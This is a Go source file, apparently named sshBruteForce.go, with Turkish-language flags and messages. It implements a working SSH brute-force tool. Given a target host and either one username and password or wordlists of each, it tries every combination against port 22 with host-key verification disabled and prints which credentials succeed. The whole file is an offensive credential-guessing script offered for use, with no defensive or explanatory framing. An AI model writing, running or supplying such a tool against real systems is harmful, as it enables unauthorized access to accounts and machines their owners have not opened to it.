package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"

	"golang.org/x/crypto/ssh"
)

func main() {

	user := flag.String("u", "", "Kullanıcı Adı Belirle")
	userFile := flag.String("U", "", "Kullanıcı Adı Dosyası Belirle")
	pass := flag.String("p", "", "Parola Belirle")
	passFile := flag.String("P", "", "Parola Dosyası Belirle")
	host := flag.String("h", "", "Host Belirtin")

	flag.Parse()

	if *pass != "" && *user != "" && *host != "" {

		ip := *host + ":22"

		config := &ssh.ClientConfig{
			User: *user,
			Auth: []ssh.AuthMethod{
				ssh.Password(*pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}

		client, err := ssh.Dial("tcp", ip, config)
		if err != nil {
			fmt.Println(*user, " ve ", *pass, " bilgileri ile SSH bağlantısı sağlanamadı")
			return
		}
		defer client.Close()

		fmt.Println(*user, " ve ", *pass, " bilgileri ile SSH bağlantısı sağlandı")

	} else if *passFile != "" && *userFile != "" && *host != "" {

		ip := *host + ":22"

		pFile, _ := os.OpenFile(*passFile, os.O_RDONLY, os.ModePerm)
		uFile, _ := os.OpenFile(*userFile, os.O_RDONLY, os.ModePerm)

		pf := bufio.NewScanner(pFile)
		uf := bufio.NewScanner(uFile)

		var usernames []string
		for uf.Scan() {
			usernames = append(usernames, uf.Text())
		}

		var paswords []string
		for pf.Scan() {
			paswords = append(paswords, pf.Text())
		}

		for _, username := range usernames {
			for _, password := range paswords {
				config := &ssh.ClientConfig{
					User: username,
					Auth: []ssh.AuthMethod{
						ssh.Password(password),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				client, err := ssh.Dial("tcp", ip, config)
				if err != nil {
					fmt.Println(username, " ve ", password, " bilgileri ile SSH bağlantısı sağlanamadı")
					continue
				}
				defer client.Close()

				fmt.Println(username, " ve ", password, " bilgileri ile SSH bağlantısı sağlandı")
			}
		}

	} else {
		fmt.Println("Lütfen Parametleri Girin")
		fmt.Println("Örnek kullanım go run .\\sshBruteForce.go -u <KullanıcıAdı> -p <Parola> -h <HedefMakine>")
		return
	}
}
